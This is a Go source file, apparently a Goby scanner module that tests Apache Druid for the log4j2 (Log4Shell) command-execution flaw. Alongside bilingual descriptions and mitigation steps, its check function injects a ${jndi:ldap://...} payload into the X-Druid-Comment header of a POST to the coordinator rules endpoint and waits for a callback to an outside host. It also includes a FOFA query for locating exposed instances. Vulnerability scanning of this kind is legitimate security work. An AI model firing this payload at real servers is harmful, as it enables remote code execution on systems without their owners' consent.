package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Druid log4j2 command execution vulnerability",
    "Description": "<p>Apache Druid is an efficient data query system, the main solution is to aggregate and query a large amount of time-based data.</p><p>Apache Druid uses log4j2 to have a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Apache Druid log4j2 command execution vulnerability",
    "Recommendation": "<p>The official website has not fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://druid.apache.org/\">https://druid.apache.org/</a></p><p>Temporary solution:</p><p>1, upgrade log4j2 to the latest version:</p><p> Download address: <a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/ logging-log4j2</a></p><p>2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify Configure log4j2.formatMsgNoLookups=True</p><p>(3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
    "Product": "Apache Druid",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Druid log4j2 命令执行漏洞",
            "Description": "<p>Apache Druid是一个高效的数据查询系统，主要解决的是对于大量的基于时序的数据进行聚合查询。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;Druid 使用 log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;Druid 使用 log4j2 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://druid.apache.org/\">https://druid.apache.org/</a></p><p>临时解决方案：</p><p><span style=\"color: var(--primaryFont-color);\">1、升级log4j2至最新版本：</span><br></p><p>&nbsp;下载地址：<a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/logging-log4j2</a></p><p>2、紧急缓解措施：</p><p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p><p>（2） 修改配置 log4j2.formatMsgNoLookups=True</p><p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>",
            "Product": "Apache Druid",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Druid log4j2 command execution vulnerability",
            "Description": "<p>Apache Druid is an efficient data query system, the main solution is to aggregate and query a large amount of time-based data.</p><p>Apache Druid uses log4j2 to have a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Apache Druid log4j2 command execution vulnerability",
            "Recommendation": "<p>The official website has not fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://druid.apache.org/\">https://druid.apache.org/< /a></p><p>Temporary solution:</p><p><span style=\"color: var(--primaryFont-color);\">1, upgrade log4j2 to the latest version:< /span><br></p><p>&nbsp;Download address: <a href=\"https://github.com/apache/logging-log4j2\">https://github.com/apache/ logging-log4j2</a></p><p>2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify Configure log4j2.formatMsgNoLookups=True</p><p>(3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
            "Product": "Apache Druid",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Druid\" && title=\"Apache\") || title=\"Apache Druid\"",
    "GobyQuery": "(title=\"Druid\" && title=\"Apache\") || title=\"Apache Druid\"",
    "Author": "Chin",
    "Homepage": "https://druid.apache.org/",
    "DisclosureDate": "2021-12-16",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10245"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			payload := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			cfg := httpclient.NewPostRequestConfig("/druid/coordinator/v1/rules/_default")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/75.0.3770.142Safari/537.36")
			cfg.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg.Header.Store("X-Druid-Comment", payload)
			cfg.Data = "[{\"period\":\"P1D\",\"includeFuture\":true,\"tieredReplicants\":{\"_default_tier\":2},\"type\":\"loadByPeriod\"}]"
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			return expResult
		},
	))
}
